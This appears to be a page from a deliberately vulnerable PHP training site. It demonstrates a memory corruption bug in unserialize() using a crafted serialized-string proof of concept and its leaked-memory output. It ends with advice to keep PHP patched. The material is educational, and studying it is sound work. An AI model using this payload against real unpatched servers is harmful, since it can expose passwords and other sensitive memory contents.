<?php
	require('includes/functions.php');
	echo getHeader('Memory Corruption');
?>

    <!-- Main jumbotron for a primary marketing message or call to action -->
    <div class="jumbotron">
        <div class="container">
            <h1>Memory Corruption</h1>
			<a class="btn btn-primary btn-lg" href="/">
				<span class="glyphicon glyphicon-chevron-left"></span>
				Back To Home
			</a>
        </div>
    </div>

    <div class="container">
        <!-- Example row of columns -->
        <div class="row">
            <div class="col-md-12">
				
				<h2>Memory Corruption - Using Free Memory</h2>
				<span>Many developers do not consider memory corruption vulnerabilities to be an issue for web-based applications. With XSS and SQL injection reigning supreme, bugs such as memory corruption are the opposite, as they're written off as "unexploitable" or simply ignored.</span><br><br>
                <span>This memory corruption bug that was discovered only functions on vulnerable PHP versions, the PHP version running on this server: <strong><?php echo phpversion(); ?></strong> and <u>is</u> vulnerable to this bug.</span>
                <br><br>
                <span>The example provided below is not powerful enough to crash PHP, but is enough to simply demonstrate the bug. See for yourself: <a href="/memory-corruption/example" target="_blank">Example</a></span>
				<br><br>
				<h4>PHP - The code running on the example page</h4>
				<pre>
					<code class="php">
&lt;?php

    $data='O:8:"stdClass":4:{';
    $data.='s:3:"123";a:10:{i:1;i:1;i:2;i:2;i:3;i:3;i:4;i:4;i:5;i:5;i:6;i:6;i:7;i:7;i:8;i:8;i:9;i:9;i:10;i:10;}';
    $data.='s:3:"123";i:0;';
    $data.='i:0;S:17:"\00\01\00\00AAAA\00\01\01\00\01\00\0B\BC\CC";';
    $data.='i:1;r:12;}';

    var_dump(serialize(unserialize($data)));

?&gt;
					</code>
				</pre>
                <span><small>Source: <a target="_blank" href="http://www.inulledmyself.com/2015/02/exploiting-memory-corruption-bugs-in.html">Exploiting Memory Corruption Bugs in PHP</a></small></span>
				<br>
                <br>
				<h4>Script Output</h4>
				<pre>
					<code class="text">
						<?php echo htmlentities('
string(80) "O:8:"stdClass":3:{s:3:"123";i:0;s:1:"0";s:17:"AAAA��";s:1:"1";i:256;}"
						'); ?>
					</code>
				</pre>
				
                Noticing from the script's output, we can see a bunch of weird characters outputted in one of the sections of the serialized PHP class. This is what is currently in an area of free memory which could potentially contain passwords, or any other sensitive information. This example is small, but a large-scale disclosure of the contents of arbitrary memory could be devastating.
                <br><br>
				<h4>How To Protect Yourself</h4>
                <span>The only way to protect yourself from these types of bugs is keeping PHP up-to-date, out of date software in general can create more problems and leave you wide open to many forms of attack. Currently, this server is running <strong><?php echo phpversion(); ?></strong>, and a patch for this bug has been released for <strong>5.6.6</strong>.</span>
			</div>
		</div>

<?php
	echo getFooter();
?>